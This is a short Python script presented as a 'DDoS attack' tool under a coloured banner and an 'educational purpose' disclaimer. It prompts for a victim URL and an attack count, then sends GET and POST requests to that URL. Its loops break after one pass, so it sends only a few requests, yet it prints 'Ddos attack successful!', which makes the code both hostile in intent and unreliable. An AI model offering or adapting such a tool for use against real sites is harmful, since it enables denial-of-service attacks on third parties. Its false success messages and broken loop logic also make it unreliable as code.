import pyfiglet
from colorama import Fore, Style, init

# Initialize Colorama
init(autoreset=True)

def print_attractive_text():
    # Create a Figlet font object
    title_font = pyfiglet.Figlet(font='slant')
    subtitle_font = pyfiglet.Figlet(font='small')

    # Define the text
    title = "ROOT RELUX"
    subtitle = "Made by JUNAYAD AHSAN"
    description = "DDOS Attack"

    # Print the title in big letters
    print(Fore.CYAN + title_font.renderText(title))
    print(Fore.YELLOW + subtitle_font.renderText(subtitle))
    print(Fore.GREEN + f"This code is made for {Style.BRIGHT}educational purpose.")
    print(Fore.MAGENTA + f"By this code, people can know about {Style.BRIGHT}{description}.")
    print(Fore.RED + f"Use this tool for {Style.BRIGHT}legal purposes.")

if __name__ == "__main__":
    print_attractive_text()
#Educational purpose
name=float(input("How many times you attack victim?:"))
import requests
url=input('Input your victim url:')

def base_url():
    response = requests.get(url)
    if response.status_code == 200:
        print("Ddos attack successful!")
    else:
        print("GET request failed with status code:", response.status_code)
counter = 0
while counter <= name:
    base_url()
    print("Ddos attack is runinng")
    break
def post_url():
    response = requests.post(url)
    if response.status_code == 200:
        print("Ddos attack successful!")
    else:
        print("Post request failed with status code:", response.status_code)
counter = 0
while counter <= name:
    post_url()
    print("Ddos attack is runing.")
    break
if __name__ == "__main__":
    base_url()
elif __name__ == "__main__":
    post_url()
